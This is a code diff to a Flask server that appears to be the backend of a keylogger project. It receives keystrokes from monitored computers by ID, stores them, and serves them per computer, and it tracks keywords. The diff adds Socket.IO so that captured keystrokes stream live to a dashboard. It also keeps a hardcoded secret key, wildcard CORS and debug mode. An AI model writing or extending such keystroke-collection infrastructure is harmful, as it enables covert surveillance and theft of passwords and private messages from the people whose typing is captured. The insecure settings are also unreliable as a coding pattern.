@@ -4,6 +4,8 @@ from keylogger.keylogger_service import KeyLoggerService
 from flask_services import user_service, computers_service, keywords_service
 from flask_cors import CORS
 import uuid
+from flask_socketio import SocketIO, emit
+import time
 
 # Get the project's root directory
 root_dir = os.path.abspath(os.path.join(os.path.dirname(__file__), '..'))
@@ -16,6 +18,7 @@ app = Flask(
 
 CORS(app)
 app.secret_key = "supersecretkey"
+socketio = SocketIO(app, cors_allowed_origins="*")
 
 keylogger = KeyLoggerService()
 
@@ -87,7 +90,10 @@ def log_keystroke():
         key = word_entry.get("key")
         timestamp = word_entry.get("timestamp")
         keylogger.log_key(comp_id, key, timestamp)
-        
+
+    # Emit the new words to the frontend
+    socketio.emit('new_keystrokes', {'comp_id': comp_id, 'words': words})
+
     return jsonify({"success": True}), 200
 
 @app.route("/api/keystrokes/<comp_id>", methods=["GET"])
@@ -114,4 +120,4 @@ def delete_keyword(kw):
     return jsonify({"success": True})
 
 if __name__ == "__main__":
-    app.run(host="127.0.0.1", port=8000, debug=True)
+    socketio.run(app, host="127.0.0.1", port=8000, debug=True)
